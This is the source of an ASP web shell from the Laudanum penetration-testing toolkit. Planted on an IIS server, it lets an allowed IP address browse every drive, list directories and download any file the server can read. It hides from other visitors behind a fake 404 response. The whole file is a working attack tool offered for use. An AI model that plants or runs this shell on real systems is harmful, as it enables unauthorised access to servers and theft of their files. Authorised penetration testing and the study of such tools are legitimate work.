<%@Language="VBScript"%>
<%Option Explicit%>
<%Response.Buffer = True%>  
<%
' *******************************************************************************
' ***
' *** Laudanum Project
' *** A Collection of Injectable Files used during a Penetration Test
' ***
' *** More information is available at:
' ***  http://laudanum.secureideas.net
' ***  laudanum@secureideas.net
' ***
' ***  Project Leads:
' ***         Kevin Johnson <kjohnson@secureideas.net
' ***         Tim Medin <tim@counterhack.com>
' ***
' *** Copyright 2014 by Kevin Johnson and the Laudanum Team
' ***
' ********************************************************************************
' ***
' *** This file provides access to the file system.
' *** Written by Tim Medin <tim@counterhack.com>
' ***
' ********************************************************************************
' *** This program is free software; you can redistribute it and/or
' *** modify it under the terms of the GNU General Public License
' *** as published by the Free Software Foundation; either version 2
' *** of the License, or (at your option) any later version.
' ***
' *** This program is distributed in the hope that it will be useful,
' *** but WITHOUT ANY WARRANTY; without even the implied warranty of
' *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' *** GNU General Public License for more details.
' ***
' *** You can get a copy of the GNU General Public License from this
' *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
' *** You can also write to the Free Software Foundation, Inc., Temple
' *** Place - Suite  Boston, MA   USA.
' ***
' ***************************************************************************** */

' ***************** Config entries below ***********************

' Define variables
Dim allowedIPs 
Dim allowed
Dim filepath
Dim file
Dim stream
Dim path
Dim i
Dim fso
Dim folder 
Dim list
Dim temppath

' IPs are enterable as individual addresses TODO: add CIDR support
allowedIPs = "192.168.0.1,127.0.0.1,::1"
' Just in cace you added a space in the line above
allowedIPs = replace(allowedIPS," ","")
'turn it into an array
allowedIPs = split(allowedIPS,",") '
' make sure the ip is allowed
allowed = 0
for i = lbound(allowedIPs) to ubound(allowedIPs)
	if allowedIPS(i) = Request.ServerVariables("REMOTE_ADDR") then
		allowed = 1
		exit for
	end if
next
' send a 404 if the IP Address is not allowed
if allowed = 0 then
	Response.Status = "404 File Not Found"
	Response.Write(Response.Status & Request.ServerVariables("REMOTE_ADDR"))
	Response.End
end if

' create file object for use everywhere
set fso = CreateObject("Scripting.FileSystemObject")

' download a file if selected
filepath = trim(Request.QueryString("file"))
'validate file
if len(filepath) > 0 then
	if fso.FileExists(filepath) then
		'valid file

		Set file = fso.GetFile(filepath)
		Response.AddHeader "Content-Disposition", "attachment; filename=" & file.Name  
		'Response.AddHeader "Content-Length", file.Size  
		Response.ContentType = "application/octet-stream"
		set stream = Server.CreateObject("ADODB.Stream")
		stream.Open
		stream.Type = 1
		Response.Charset = "UTF-8"
		stream.LoadFromFile(file.Path)
		' TODO: Downloads for files greater than 4Mb may not work since the default buffer limit in IIS is 4Mb.
 		Response.BinaryWrite(stream.Read)
		stream.Close
		set stream = Nothing
		set file = Nothing
		Response.End
	end if
end if

' begin rendering the page
%>
<html>
<head>
  <title>Laudanum ASP File Browser</title>
</head>
<body>

<h1>Laudanum File Browser 0.1</h1>

<%
' get the path to work with, if it isn't set or valid then start with the web root
' goofy if statement is used since vbscript doesn't use short-curcuit logic
path = trim(Request.QueryString("path"))
if len(path) = 0 then
	path = fso.GetFolder(Server.MapPath("\"))
elseif not fso.FolderExists(path) then
	path = fso.GetFolder(Server.MapPath("\"))
end if

set folder = fso.GetFolder(path)

' Special locations, webroot and drives
%><b>Other Locations:</b> <%
for each i in fso.Drives
	if i.IsReady then
		%><a href="<%=Request.ServerVariables("URL") & "?path=" & i.DriveLetter%>:\"><%=i.DriveLetter%>:</a>&nbsp;&nbsp;<%
	end if
next
%><a href="<%=Request.ServerVariables("URL")%>">web root</a><br/><%

' Information on folder
%><h2>Listing of: <%
list = split(folder.path, "\")
temppath = ""
for each i in list
	temppath = temppath & i & "\"
	%><a href="<%=Request.ServerVariables("URL") & "?path=" & Server.URLEncode(temppath)%>"><%=i%>\</a> <%
next
%></h2><%

' build table for listing
%><table>
<tr><th align="left">Name</th><th>Size</th><th>Modified</th><th>Accessed</th><th>Created</th></tr><%
' Parent Path if it exists
if not folder.IsRootFolder then
	%><tr><td><a href="<%=Request.ServerVariables("URL") & "?path=" & Server.URLEncode(folder.ParentFolder.Path)%>">..</a></td><%
end if

' Get the folders
set list = folder.SubFolders
for each i in list
        %><tr><td><a href="<%=Request.ServerVariables("URL") & "?path=" & Server.URLEncode(i.Path)%>"><%=i.Name%>\</a></td></tr><%
next

' Get the files
set list = folder.Files
for each i in list
        %><tr><td><a href="<%=Request.ServerVariables("URL") & "?file=" & Server.URLEncode(i.Path)%>"><%=i.Name%></a></td><td align="right"><%=FormatNumber(i.Size, 0)%></td><td align="right"><%=i.DateLastModified%></td><td align="right"><%=i.DateLastAccessed%></td><td align="right"><%=i.DateCreated%></td></tr><%
next

' all done
%>
 </table>
 <hr/>
  <address>
  Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>

</body>
</html>
